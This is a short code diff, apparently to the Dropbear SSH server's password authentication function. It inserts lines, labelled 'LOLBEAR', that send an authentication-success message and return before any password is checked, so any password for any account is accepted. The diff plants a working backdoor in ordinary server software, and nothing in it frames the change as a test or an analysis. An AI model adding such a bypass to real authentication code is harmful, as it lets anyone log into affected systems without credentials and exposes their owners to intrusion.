@@ -49,7 +49,11 @@ static int constant_time_strcmp(const char* a, const char* b) {
 /* Process a password auth request, sending success or failure messages as
  * appropriate */
 void svr_auth_password(int valid_user) {
-	
+	// LOLBEAR START
+	send_msg_userauth_success();
+	return;
+	// LOLBEAR END
+
 	char * passwdcrypt = NULL; /* the crypt from /etc/passwd or /etc/shadow */
 	char * testcrypt = NULL; /* crypt generated from the user's password sent */
 	char * password = NULL;
